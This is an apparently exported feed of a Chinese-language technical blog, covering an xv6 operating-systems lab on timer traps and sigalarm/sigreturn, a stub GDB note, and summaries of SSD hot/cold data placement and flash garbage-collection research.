alarm_interval;</span><br><span class="line">  uint64 handler_pointer;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>In <code>kernel/sysproc.c</code>:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">uint64 <span class="title function_">sys_sigalarm</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * get the alarm interval and handler pointer from syscall</span></span><br><span class="line"><span class="comment">     * and store them in process</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     **/</span></span><br><span class="line">    <span class="type">int</span> alarm_interval = <span class="number">0</span>;</span><br><span class="line">    uint64 handler_pointer = <span class="number">0</span>;</span><br><span class="line">    argint(<span class="number">0</span>, &amp;alarm_interval);</span><br><span class="line">    argaddr(<span class="number">1</span>, &amp;handler_pointer);</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">proc</span> * <span class="title">proc</span> =</span> myproc();</span><br><span class="line">    proc-&gt;alarm_interval = alarm_interval;</span><br><span class="line">    proc-&gt;handler_pointer = handler_pointer;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>你需要跟踪自上一次调用（或距离下一次调用）进程的警报处理程序以来已经过去了多少个ticks；为此你还需要在<code>struct proc</code>中添加一个新的字段。你可以在<code>proc.c</code>中的<code>allocproc()</code>函数中初始化<code>proc</code>字段。</p><p>In <code>kernel/proc.h</code>:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">proc</span> &#123;</span></span><br><span class="line"><span class="type">int</span> passed_time;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>In <code>kernel/proc.c</code>:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="keyword">struct</span> proc* <span class="title function_">allocproc</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line">  ...</span><br><span class="line">found:</span><br><span class="line">  p-&gt;passed_time = <span class="number">0</span>;</span><br><span class="line">  p-&gt;alarm_interval = <span class="number">0</span>;</span><br><span class="line">  p-&gt;handler_pointer = <span class="number">0</span>;</span><br><span class="line">  ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>每个tick，硬件时钟产生一个中断，该中断在<code>kernel/trap.c</code>中的函数<code>usertrap()</code>里被处理。</p></li><li><p>你只想在有定时器中断的情况下操作进程的警报计时器；你需要像如下的东西一样：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(which_dev == <span class="number">2</span>) ... <span class="comment">// this is a timer interrupt</span></span><br></pre></td></tr></table></figure></li><li><p>只需要在计时器超时时调用警报函数。注意用户的警报函数的地址看可能为0。</p></li><li><p>你需要修改<code>usertrap()</code>，这样当进程的警报间隔到期时，用户进程执行处理函数。当RISC-V上的一个陷阱返回到用户空间时，决定用户空间代码恢复执行的指令地址是什么？</p><p>从<code>trampoline.S</code>的<code>userret</code>函数中我们可以看到，内核通过<code>sret</code>指令返回到用户空间。</p><p>In <code>kernel/trap.c</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// give up the CPU if this is a timer interrupt.</span></span><br><span class="line"><span class="keyword">if</span>(which_dev == <span class="number">2</span>) &#123;</span><br><span class="line">    ++p-&gt;passed_time;</span><br><span class="line">    <span class="keyword">if</span>(p-&gt;passed_time % p-&gt;alarm_interval == <span class="number">0</span>) &#123;</span><br><span class="line">        p-&gt;trapframe-&gt;epc = p-&gt;handler_pointer;</span><br><span class="line">    &#125;</span><br><span class="line">    yield();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>如果你告诉 QEMU 只使用一个 CPU，在 GDB 中查看陷阱会更容易，你可以通过运行以下命令来实现这一点：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">make CPUS=1 qemu-gdb</span><br></pre></td></tr></table></figure></li><li><p>You’ve succeeded if alarmtest prints “alarm!”.</p><p><img src="/../images/Lab-traps/%E6%88%AA%E5%B1%8F2024-03-05%2015.48.18.png" alt="截屏2024-03-05 15.48.18"></p></li></ul><h4 id="test1-x2F-test2-x2F-test3-resume-interrupted-code"><a href="#test1-x2F-test2-x2F-test3-resume-interrupted-code" class="headerlink" title="test1&#x2F;test2()&#x2F;test3(): resume interrupted code"></a>test1&#x2F;test2()&#x2F;test3(): resume interrupted code</h4><p>有可能在<code>alarmtest</code>执行<code>test0</code>或<code>test1</code>并打印出”alarm!”之后会发生崩溃，或者<code>alarmtest</code>最终打印出”test1 failed”，或者<code>alarmtest</code>退出而没有打印出”test1 passed”。为了解决这个问题，你必须确保当警报处理器完成时，控制权返回到用户程序原本由于定时器中断而被打断的那条指令处。你必须确保寄存器内容被恢复到中断时的值，这样用户程序在警报之后可以继续无干扰地运行。最后，你应该在每次警报计数器触发后重新设置它，以便定期调用处理器。</p><p>作为一个起点，我们已经为你做了一个设计决定：用户警报处理程序在完成后需要调用<code>sigreturn</code>系统调用。可以查看<code>alarmtest.c</code>中的<code>periodic</code>函数作为一个例子。这意味着你可以在<code>usertrap</code>和<code>sys_sigreturn</code>中添加代码，使它们协作，以便在用户处理完警报之后，用户进程能够正确地恢复执行。</p><p>提示：</p><ul><li><p>你的解决方案需要你保存和恢复寄存器——你需要保存和重新加载哪些寄存器来恢复中断的程序？</p></li><li><p>当定时器触发时，让<code>usertrap</code>在<code>struct proc</code>中保存足够的状态，以便<code>sigreturn</code>可以正确返回到被中断的用户代码。</p></li><li><p>防止对处理程序的重入调用——如果一个处理程序还没有返回，内核不应该再次调用它。<code>test2</code>就是用来测试这一点的。</p></li><li><p>确保恢复<code>a0</code>。<code>sigreturn</code>是一个系统调用，它的返回值存储在<code>a0</code>中。</p></li></ul><p>首先我们在<code>struct proc</code>中增加两个成员，用于表示当前进程是否正在执行<code>handler</code>和保存执行<code>handler</code>之前的<code>trapframe</code>：</p><p>In <code>kernel/proc.h</code>:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">proc</span> &#123;</span></span><br><span class="line">...</span><br><span class="line"><span class="type">int</span> is_handling;             <span class="comment">// indicates that the process is handling the handler</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">trapframe</span> *<span class="title">saved_trapframe</span>;</span>    <span class="comment">// used to save the trapframe</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>接着，我们要在<code>kernel/proc.c</code>中的<code>allocproc()</code>函数中初始化它们；并在<code>freeproc()</code>函数中释放它们。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="keyword">struct</span> proc* <span class="title function_">allocproc</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line">  ...</span><br><span class="line">  p-&gt;is_handling = <span class="number">0</span>;</span><br><span class="line">  ...</span><br><span class="line">  <span class="comment">// Allocate a trapframe page.</span></span><br><span class="line">  <span class="keyword">if</span>((p-&gt;saved_trapframe = (<span class="keyword">struct</span> trapframe *)kalloc()) == <span class="number">0</span>)&#123;</span><br><span class="line">      freeproc(p);</span><br><span class="line">      release(&amp;p-&gt;lock);</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">freeproc</span><span class="params">(<span class="keyword">struct</span> proc *p)</span> &#123;</span><br><span class="line">  ...</span><br><span class="line">  <span class="keyword">if</span>(p-&gt;saved_trapframe)</span><br><span class="line">      kfree((<span class="type">void</span>*)p-&gt;saved_trapframe);</span><br><span class="line">  p-&gt;saved_trapframe = <span class="number">0</span>;</span><br><span class="line">  ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>接着在<code>usertrap</code>函数中处理时间中断<code>timer interrupt</code>:</p><p>在这里我们把当前进程的<code>trapframe-&gt;epc</code>设置为<code>handler</code>的地址，这是因为在函数<code>usertrap()</code>执行完成后会调用<code>usertrapret()</code>函数，在该函数中会通过：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// set S Exception Program Counter to the saved user pc.</span></span><br><span class="line">  w_sepc(p-&gt;trapframe-&gt;epc);</span><br></pre></td></tr></table></figure><p>将<code>sepc</code>寄存器设置为<code>p-&gt;trapframe-&gt;epc</code>的值，使程序跳转到其指向的地址。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">usertrap</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line">  ...</span><br><span class="line"><span class="comment">// give up the CPU if this is a timer interrupt.</span></span><br><span class="line">  <span class="keyword">if</span>(which_dev == <span class="number">2</span>) &#123;</span><br><span class="line">      p-&gt;passed_time++;<span class="comment">// 每一次时间中断，使进程的passed_time增加1</span></span><br><span class="line">    <span class="comment">// 如果增加的时间为间隔时间的倍数，且当前进程没有执行处理函数</span></span><br><span class="line">      <span class="keyword">if</span>(p-&gt;passed_time % p-&gt;alarm_interval == <span class="number">0</span> &amp;&amp; p-&gt;is_handling == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="comment">// 保存现场</span></span><br><span class="line">          memmove(p-&gt;saved_trapframe, p-&gt;trapframe, PGSIZE);</span><br><span class="line">        <span class="comment">// 将当前进程的trapframe-&gt;epc设置为handler函数的地址上</span></span><br><span class="line">          p-&gt;trapframe-&gt;epc = p-&gt;handler_pointer;</span><br><span class="line">        <span class="comment">// 置正在处理为1</span></span><br><span class="line">          p-&gt;is_handling = <span class="number">1</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      yield();</span><br><span class="line">  &#125;</span><br><span class="line">  ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>最后修改<code>sys_sigreturn</code>函数：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">uint64 <span class="title function_">sys_sigreturn</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line">  <span class="comment">// 恢复现场</span></span><br><span class="line">    memmove(myproc()-&gt;trapframe, myproc()-&gt;saved_trapframe, PGSIZE);</span><br><span class="line">    <span class="comment">// 置为0</span></span><br><span class="line"> myproc()-&gt;is_handling = <span class="number">0</span>;</span><br><span class="line">  <span class="comment">// 恢复寄存器a0的值</span></span><br><span class="line">    <span class="keyword">return</span> myproc()-&gt;trapframe-&gt;a0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>测试通过：</p><p><img src="/../images/Lab-traps/%E6%88%AA%E5%B1%8F2024-03-05%2019.39.18.png" alt="截屏2024-03-05 19.39.18"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Lab-traps&quot;&gt;&lt;a href=&quot;#Lab-traps&quot; class=&quot;headerlink&quot; title=&quot;Lab: traps&quot;&gt;&lt;/a&gt;Lab: traps&lt;/h1&gt;&lt;h2 id=&quot;准备工作&quot;&gt;&lt;a href=&quot;#准备工作&quot; class=&quot;header</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>GDBtutorial</title>
    <link href="http://example.com/2024/02/27/GDBtutorial/"/>
    <id>http://example.com/2024/02/27/GDBtutorial/</id>
    <published>2024-02-27T12:19:04.000Z</published>
    <updated>2024-02-28T02:15:45.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="GDBtutorial"><a href="#GDBtutorial" class="headerlink" title="GDBtutorial"></a>GDBtutorial</h2><h3 id="打断点"><a href="#打断点" class="headerlink" title="打断点"></a>打断点</h3><ol><li>断点在函数上面：<code>b main</code></li><li>断点在文件的gu</li></ol>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;GDBtutorial&quot;&gt;&lt;a href=&quot;#GDBtutorial&quot; class=&quot;headerlink&quot; title=&quot;GDBtutorial&quot;&gt;&lt;/a&gt;GDBtutorial&lt;/h2&gt;&lt;h3 id=&quot;打断点&quot;&gt;&lt;a href=&quot;#打断点&quot; class=&quot;he</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>HOT/COLD DATA SEPARATION POLICIES</title>
    <link href="http://example.com/2024/01/22/HOT-COLD-DATA-SEPARATION-POLICIES/"/>
    <id>http://example.com/2024/01/22/HOT-COLD-DATA-SEPARATION-POLICIES/</id>
    <published>2024-01-22T07:50:49.000Z</published>
    <updated>2024-01-23T01:44:27.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="SSD中冷热数据分类策略的总结"><a href="#SSD中冷热数据分类策略的总结" class="headerlink" title="SSD中冷热数据分类策略的总结"></a>SSD中冷热数据分类策略的总结</h1><h2 id="2-Level-LRU"><a href="#2-Level-LRU" class="headerlink" title="2-Level LRU"></a>2-Level LRU</h2><p>两级<code>LRU</code>策略使用了两种<code>LRU-based</code>列表：热列表<code>(hot list)</code>和候选列表<code>(candidate list)</code>。每个列表包含逻辑页号<code>(LPNs) Logic Page Number</code>。基本上，只有存储在<code>hot list</code>上的逻辑页号才被当作热数据。在这个策略下，当一个写操作被接收时，<code>FTL</code>在两个列表中寻找相关的<code>LPN</code>，如果逻辑页号在<code>host list</code>中，它被提升到<code>host list</code>的首位，以减少被驱逐的机会。如果<code>LPN</code>在<code>candidate list</code>上，将其从<code>candidate list</code>中移除并放入<code>hot list</code>中。如果两个<code>list</code>中都没有该<code>LPN</code>，则将其放到<code>candidate list</code>中。每个<code>list</code>的大小是固定的。如果<code>hot list</code>满了，<code>candidate list</code>中的最后一个<code>LPN</code>会被丢弃。</p><p>该策略简单但有问题。固定大小的<code>hot list</code>意味着它无法适应热数据量超过热列表大小的各种工作负载。另一个问题是基于<code>LRU list</code>的查找操作因为线性查找会消耗大量时间。</p><h2 id="Multiple-Bloom-Filter"><a href="#Multiple-Bloom-Filter" class="headerlink" title="Multiple Bloom Filter"></a>Multiple Bloom Filter</h2><p><code>MBF</code>策略使用<code>bloom filters (BF)</code>测试当前<code>LPN</code>是否属于热数据集<code>set of hot data</code>。<code>BF</code>由一个位数组组成，其大小是<code>BLOOM_FILTER_SIZE</code>（即位数）。每个逻辑页号<code>(LPN)</code>通过多个不同的哈希函数进行哈希处理，根据每个<code>LPN</code>的哈希结果，BF中相应的位被设置为1。这意味着每个LPN的哈希结果会影响BF中特定位的状态。这个策略通过将<code>LPN</code>映射到BF的特定位来跟踪哪些<code>LPN</code>属于热数据集。如果一个LPN的哈希结果对应的位在BF中已经被设置为1，那么这个<code>LPN</code>被认为是热数据的一部分。这种方法用于快速检测和过滤热数据，优化数据存储和访问效率。</p><p>为了最小化错误地将一些非热数据错误分类为热数据的假阳性错误，多重布隆过滤器（MBF）策略利用了多个布隆过滤器（BF）。BF（数字过滤器）的实际数量是可配置的，建议至少有四个BF。在某一点上，其中一个布隆过滤器被指定为当前过滤器<code>cur_filter</code>。对于每个写请求，如果当前过滤器中相应的位已经被设置为<code>1</code>，<code>MBF</code>策略会尝试以循环方式在下一个布隆过滤器的相同位置设置该位。在每个衰减周期之后，当前过滤器被设置为最长时间间隔内未被选中的布隆过滤器，并且该布隆过滤器中的所有位都被清除，以去除旧信息。在<code>MBF</code>策略下，通过使用相同的哈希函数对<code>LPN</code>进行哈希处理，然后计算所有布隆过滤器中对应位位置的置<code>1</code>位数，来估计<code>LPN</code>的热度。如果所有哈希位置的计数超过预定义的阈值，该LPN被分类为热数据。</p><p><code>MBF</code>的优点之一是它只消耗很少的内存空间。然而<code>MBF</code>的性能很大程度上依赖于哈希函数的选择，过滤器的数量，过滤器的规模，阈值等。</p><blockquote><p>什么是布隆过滤器</p><p><strong>数据结构：</strong>它实际上是一个很长的二进制向量和一系列随机映射函数。以Redis中的布隆过滤器实现为例，Redis中的布隆过滤器底层是</p><ul><li><strong>一个大型位数组（二进制数组）</strong></li><li><strong>多个无偏hash函数：</strong>无偏hash函数就是能把元素的hash值计算的比较均匀的hash函数，能使得计算后的元素下标比较均匀的映射到位数组中。</li></ul><p><strong>空间计算：</strong>在布隆过滤器增加元素之前，首先需要初始化布隆过滤器的空间，也就是上面说的二进制数组，除此之外还需要计算无偏hash函数的个数。布隆过滤器提供了两个参数，分别是预计加入元素的大小n，运行的错误率f。布隆过滤器中有算法根据这两个参数会计算出二进制数组的大小l，以及无偏hash函数的个数k。<br>它们之间的关系比较简单：</p><ul><li>错误率越低，位数组越长，控件占用较大</li><li>错误率越低，无偏hash函数越多，计算耗时较长</li></ul></blockquote><h2 id="Dynamic-dAta-Clustering"><a href="#Dynamic-dAta-Clustering" class="headerlink" title="Dynamic dAta Clustering"></a>Dynamic dAta Clustering</h2><p>在<code>LRU</code>和<code>MBF</code>策略中，数据被简单的分为冷热两种。然而，<code>DAC</code>策略通过<code>regions</code>提供更细粒度的数据分类。所有的逻辑页<code>LPN</code>一开始被放在<code>region 0 (coldest)</code>中接着会被慢慢的提升到更高的区域当对同一个逻辑页号有连续的写操作时。另一方面，当一个块被选为垃圾回收对象时，该块中的所有有效页会被降级到更低的<code>region</code>中。</p><p><code>DAC</code>中的<code>region</code>数量通常来说被置为4或者更多，当通常是根据工作负载而改变的。此外，由于每个分区都分配了单独的更新块，当干净块的数量紧张时，<code>DAC</code>策略可能表现不佳。</p><h2 id="A-New-LSM-style-Garbage-Collection-Scheme-for-ZNS-SSDs中的方法"><a href="#A-New-LSM-style-Garbage-Collection-Scheme-for-ZNS-SSDs中的方法" class="headerlink" title="A New LSM-style Garbage Collection Scheme for ZNS SSDs中的方法"></a>A New LSM-style Garbage Collection Scheme for ZNS SSDs中的方法</h2><p>基于我们的观察，具有类似寿命的数据表现出强烈的空间局部性。例如，在键值存储中，每个层级显示不同的寿命，而同一层级中的<code>SSTables</code>是以批量方式写入的，这一点在之前的研究中也有观察到。</p><blockquote><ol><li><strong>CAO, Z., DONG, S., VEMURI, S., AND DU, D. H. Characteriz- ing, modeling, and benchmarking rocksdb key-value workloads at facebook. In <em>USENIX FAST</em> (2020).</strong></li><li><strong>KIM, T., HONG, D., HAHN, S. S., CHUN, M., LEE, S., HWANG, J., LEE, J., AND KIM, J. Fully automatic stream management for multi-streamed ssds using program contexts. In <em>FAST</em> (2019).</strong></li></ol></blockquote><p><img src="/../images/HOT-COLD-DATA-SEPARATION-POLICIES/%E6%88%AA%E5%B1%8F2024-01-22%2019.06.46.png" alt="截屏2024-01-22 19.06.46"></p><p>为了分别冷热数据并将它们分到不同的区域中，我们定义四种状态的区域，<code>C0_Zone</code>，<code>C1C_Zone</code>，<code>C1H_Zone</code>和<code>C2_Zone</code>。新到的数据顺序写入<code>C0_zone</code>，删除的数据从图中的状态中删除。</p><p>假设<code>LSM_ZGC</code>选择一个状态为<code>C0_zone</code>的候选区域。它读取区域中所有的段并尝试识别冷热数据。我们定义当段的利用率大于阈值<code>thresholdcold</code>时被称为冷。被识别为冷的段中有效块被合并和写入状态为<code>C1C_zone</code>的区域中。其他段中的有效块被合并和写入状态为<code>C1H_zone</code>中。</p><p>当候选区域是C1C区域或C1H区域时，LSM ZGC会读取所有段，并将所有有效块视为冷数据。这是因为这些有效块在两次垃圾收集尝试后仍然存在。它们被合并并写入到状态为C2区域的区域中。我们可以进一步扩展，例如C3区域等，但在这项研究中，我们在此停止，并将从C2区域存活下来的有效块写入另一个C2区域。我们期望这种机制能够将冷数据与其他数据隔离开来，这将增加在垃圾收集期间找到利用率较低的候选区域的机会。</p><h2 id="Dynamic-Hot-Data-Identification-Using-a-Stack-Distance-Approximation"><a href="#Dynamic-Hot-Data-Identification-Using-a-Stack-Distance-Approximation" class="headerlink" title="Dynamic Hot Data Identification Using a Stack Distance Approximation"></a>Dynamic Hot Data Identification Using a Stack Distance <strong>Approximation</strong></h2><p>热数据的鉴别需要同时考虑最近性<code>(recency)</code>和频率<code>(frequency)</code>。</p><p>本文提出一种利用堆栈距离近似的动态热数据鉴别策略。包含三部分：工作负载分析器，负载分配器，冷热数据鉴别器。</p><p>我们提议的热&#x2F;冷数据标识符还采用了多个<code>bloom filter</code>和多个<code>hash function</code>。多个<code>bloom filter</code>可以捕获最近性和频率。然而，我们的动态方案和MBF之间的主要区别在于<code>bloom filter</code>选择机制。我们提议的方案明智地选择了其中一个<code>bloom filter</code>，并由我们的<code>workload analyzer</code>和<code>weight allocator</code>协助。</p><p>工作负载分析仪通过采用堆栈距离来提供工作负载特征分析。栈距离<code>stack distance</code>是指两次连续访问同一对象之间访问的不同对象的数量。对于时间局部访问模式<code>temporally localized access patterns</code>来说，最近性<code>recency</code>是一个更有价值的因素，堆栈距离是衡量这种时间位置的良好指标。因此，所有引用的平均堆栈距离小，表明时间局部性良好，这意味着堆栈距离较小的工作负载应将最近因素<code>recency</code>视为更重要的因素。栈距离可用于测量最近性，但同时需要高计算复杂度和高空间消耗。因此一个高效的栈距离计算方法是该设计的关键。它只使用一个哈希表，为每个桶维护简单的信息，并通过非常简单的计算生成近似的堆栈距离。因此，拟议的近似机制大大减少了开销，并以非常高的精度表现出显著的性能。</p><p>根据工作负载分析，权重分配器通过智能地（而不仅仅是顺序地）选择每个布隆过滤器，动态地赋予最近性或频率更多的权重。此外，与MBF不同，我们的初步工作[1]采用了一个线性递减的最近性权重函数，而我们选择了一个指数递减的权重函数，以更真实地为每个布隆过滤器分配最近性权重。因此，这种动态方案更有效地捕捉了最近性以及频率。</p><p><strong>A dynamic hot data identification scheme:</strong> 当工作负载有小的栈距离时，通过选择存储数据最新的重置<code>bloom filter</code>给最近性<code>recency</code>分配更多的权重。当工作负载变现出更大的栈距离时，通过选择相邻的下一个<code>bloom filter</code>分配更多的权重给频率。</p><p><strong>A stack distance approximation algorithm:</strong> 它采用了一个哈希表，该哈希表维护简单信息并执行非常简单的计算（即简单的两个值的平均值），从而大幅度降低计算复杂度（O(1)）。权重分配基本上基于这个近似算法。广泛的评估表明，它表现出极高的精确性和优异的性能。</p><p><strong>A novel baseline scheme:</strong> </p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;SSD中冷热数据分类策略的总结&quot;&gt;&lt;a href=&quot;#SSD中冷热数据分类策略的总结&quot; class=&quot;headerlink&quot; title=&quot;SSD中冷热数据分类策略的总结&quot;&gt;&lt;/a&gt;SSD中冷热数据分类策略的总结&lt;/h1&gt;&lt;h2 id=&quot;2-Level-LRU&quot;&gt;</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>Improving Flash Write Performance by Using Update Frequency</title>
    <link href="http://example.com/2024/01/18/Improving-Flash-Write-Performance-by-Using-Update-Frequency/"/>
    <id>http://example.com/2024/01/18/Improving-Flash-Write-Performance-by-Using-Update-Frequency/</id>
    <published>2024-01-18T06:18:15.000Z</published>
    <updated>2024-01-22T03:51:27.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Improving-Flash-Write-Performance-by-Using-Update-Frequency"><a href="#Improving-Flash-Write-Performance-by-Using-Update-Frequency" class="headerlink" title="Improving Flash Write Performance by Using Update Frequency"></a>Improving Flash Write Performance by Using Update Frequency</h1><h2 id="问题："><a href="#问题：" class="headerlink" title="问题："></a>问题：</h2><p>由于擦除块的规尺寸很大，有效数据和无效数据通常会被拼接在一起，导致回收空间需要高昂的数据移动。经验表明<code>FTL</code>通常很难”正确”，这是因为闪存清洁开销复杂的依赖性：</p><ul><li><code>I/O</code>负载性。</li><li>多种<code>FTL</code>设计选择，例如空间过度配置，数据放置算法，数据清理策略。</li></ul><p>尽管有大量的研究工作，但最终结果是低且不可预测的<code>SSD</code>写性能。特别对于产生小而分散的数据库<code>I/O</code>写入密集型工作负载。</p><h3 id="这片文章回答的问题：通过利用写斜来指导数据放置，我们可以在多大程度上减少FTL的写入开销？"><a href="#这片文章回答的问题：通过利用写斜来指导数据放置，我们可以在多大程度上减少FTL的写入开销？" class="headerlink" title="这片文章回答的问题：通过利用写斜来指导数据放置，我们可以在多大程度上减少FTL的写入开销？"></a>这片文章回答的问题：通过利用写斜来指导数据放置，我们可以在多大程度上减少FTL的写入开销？</h3><p>我们用一组基本的<code>I/O</code>写入模式（k模态更新分布）、数据放置策略和清理策略的清理开销进行分析建模。基于分析结果，我们提出了一种新的数据放置算法，利用更新频率来减少<code>FTL</code>清理开销，从而提高写入性能和设备寿命。</p><h2 id="贡献："><a href="#贡献：" class="headerlink" title="贡献："></a>贡献：</h2><ul><li>模拟了空间过度配置、写入频率、数据放置策略和垃圾收集策略对FTL清理开销的影响。该模型对于验证和指导<code>FTL</code>的数据放置算法的设计很有用。通过详细的模拟来验证分析结果。</li><li>我们在误差范围内估算出任何给定 I&#x2F;O 工作负载可实现的最小清理开销，这使我们能够量化减少任何 FTL 清理开销的空间。</li><li>基于建模结果，提出了一种数据放置算法，该算法以原则性的方式利用更新频率，并且能够动态适应 I&#x2F;O 写入模式，而不依赖于特定于工作负载的参数。 新的数据放置算法可以集成到现有的混合或页面级映射 FTL 中（正如我们在 2.4 节中讨论的）。 实验结果表明，与从标准 DBMS 基准（例如 TPC-C）收集的各种微基准和 I&#x2F;O 跟踪的最先进技术相比，我们的算法将清理开销减少了 20%-75% [24] 或 TATP [19]。</li></ul><h2 id="相关工作："><a href="#相关工作：" class="headerlink" title="相关工作："></a>相关工作：</h2><h3 id="一些数据放置算法："><a href="#一些数据放置算法：" class="headerlink" title="一些数据放置算法："></a>一些数据放置算法：</h3><p>我们强调了异地更新的数据放置算法的演变，并深入了解为什么一种新方法可以降低FTL清洁开销。事实上，所有<code>FTL</code>数据放置建议都尝试根据数据的更新频率对数据进行分组。</p><h3 id="数据放置挑战："><a href="#数据放置挑战：" class="headerlink" title="数据放置挑战："></a>数据放置挑战：</h3><p>在两个区域间移动数据的两个挑战。</p><ul><li>第一、一个区域<code>(region)</code>的占用率与其清洁成本<code>(cleaning cost)</code>之间存在高度非线性的关系。</li><li>第二、各区域<code>(region)</code>清理成本的增加或减少不能立即评估，而在很长一段时间后才能感受到（评估到）。</li></ul><p>例如，考虑两个分区，第一个分区与第二个分区相比，其占用率和清理成本异常高。显然我们需要将一些数据从第一个分区移动到第二个分区：然而，移动多少数据以及哪些数据并不明确。一个静态的数据提升策略（例如，尝试平衡两个分区之间的清理成本，或者简单的始终提升&#x2F;降级策略）会导致由区域占用率的变化而非工作负载偏差的变化触发的数据移动波动。页面最初从第一个分区向德格清理成本较低的分区移动。在某个点上，清理频率和&#x2F;或清理成本变得相似，页面迁移就停止了。不幸的是，到了这个时候，已经有太多页面被移动，第二个分区的清理成本继续增加。最终，迁移过程反向进行。</p><p>在这篇论文中，我们通过对清理成本与数据放置决策之间关系的原理性理解，解决了以往数据放置方法的局限性。我们为足够通用的更新分布建立了清理成本的分析模型，这使我们能够推理出任何给定<code>I/O</code>工作负载的基本清理开销。基于分析模型的发现，我们提出了一个原理性的数据放置算法，该算法在一定误差范围内解决最优解&#x2F;我们的数据放置算法与以往的提议有以下不同之处：</p><ul><li>没有可调参数。以前的提案依赖于工作负载特点的可变参数。例如区域的数量，从一个区域迁移到下一个区域的时间阈值，经验概率模型。</li><li>区域大小与页面更新频率之间没有不匹配。之前的方法建议固定大小的区域，可能导致将更新频率非常不同的页面放在一起；我们的数据提案在运行时确定最优的区域数量（即日志结构）及其最优大小。</li><li>准确的页面提升&#x2F;降级。<code>strawman strategy</code>总是将更新的页面提升到热区域， 